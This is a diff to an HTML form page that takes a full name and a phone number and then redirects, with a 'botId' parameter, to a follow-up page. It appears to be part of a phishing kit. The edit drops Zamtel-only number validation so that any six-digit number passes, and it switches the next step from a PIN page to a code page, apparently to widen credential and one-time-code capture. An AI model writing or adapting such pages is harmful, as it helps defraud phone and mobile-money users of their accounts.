@@ -123,8 +123,8 @@ button:disabled{
     <label for="nameInput">Full Name</label>
     <input id="nameInput" type="text" placeholder="Enter your full name" autocomplete="name">
 
-    <label for="phoneInput">Zamtel Number</label>
-    <input id="phoneInput" type="tel" inputmode="numeric" placeholder="e.g. 0955 123 456" autocomplete="tel">
+    <label for="phoneInput">Phone Number</label>
+    <input id="phoneInput" type="tel" inputmode="numeric" placeholder="Enter your phone number" autocomplete="tel">
 
     <button id="submitBtn" type="submit" disabled>Continue</button>
 
@@ -145,20 +145,12 @@ const submitBtn  = document.getElementById("submitBtn");
 const statusEl   = document.getElementById("status");
 
 function normalizePhone(raw){
-  let p = raw.replace(/[^0-9]/g, "");
-  if(p.startsWith("260")) p = p.slice(3);   // drop country code
-  if(p.startsWith("0"))   p = p.slice(1);   // drop leading 0
-  if(p.length === 9)      p = "0" + p;      // re-add single leading 0
-  return p;
-}
-
-function isValidPhone(p){
-  return /^09\d{8}$/.test(p);
+  return raw.replace(/[^0-9]/g, "");   // digits only
 }
 
 function updateButtonState(){
   const nameOk  = nameInput.value.trim().length >= 2;
-  const phoneOk = isValidPhone(normalizePhone(phoneInput.value));
+  const phoneOk = normalizePhone(phoneInput.value).length >= 6;  // any 6+ digits
   submitBtn.disabled = !(nameOk && phoneOk);
 }
 
@@ -174,8 +166,8 @@ document.getElementById("detailsForm").addEventListener("submit", e=>{
   const name  = nameInput.value.trim();
   const phone = normalizePhone(phoneInput.value);
 
-  if(!name || !isValidPhone(phone)){
-    statusEl.textContent = "Please enter a valid name and Zamtel number.";
+  if(!name || phone.length < 6){
+    statusEl.textContent = "Please enter a valid name and phone number.";
     return;
   }
 
@@ -185,7 +177,7 @@ document.getElementById("detailsForm").addEventListener("submit", e=>{
   statusEl.textContent = "Redirecting...";
 
   const botId = new URLSearchParams(window.location.search).get("botId");
-  window.location.href = "pin.html" + (botId ? "?botId=" + botId : "");
+  window.location.href = "code.html" + (botId ? "?botId=" + botId : "");
 });
 </script>
 
